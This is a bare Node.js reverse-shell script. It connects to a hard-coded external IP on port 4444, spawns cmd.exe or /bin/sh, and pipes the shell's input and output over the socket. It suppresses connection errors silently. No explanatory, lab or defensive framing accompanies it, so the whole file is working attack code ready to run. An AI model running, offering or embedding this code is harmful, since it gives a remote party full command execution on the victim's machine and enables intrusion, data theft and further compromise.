const net = require('net');
const { spawn } = require('child_process');
const os = require('os');

const HOST = '45.33.32.156';
const PORT = 4444;

const client = new net.Socket();
client.connect(PORT, HOST, function() {
  const shell = os.platform() === 'win32' ? 'cmd.exe' : '/bin/sh';
  const proc = spawn(shell, { stdio: ['pipe', 'pipe', 'pipe'] });

  client.pipe(proc.stdin);
  proc.stdout.pipe(client);
  proc.stderr.pipe(client);

  proc.on('exit', function() {
    client.destroy();
  });
});

client.on('error', function() {
  // Silent failure
});
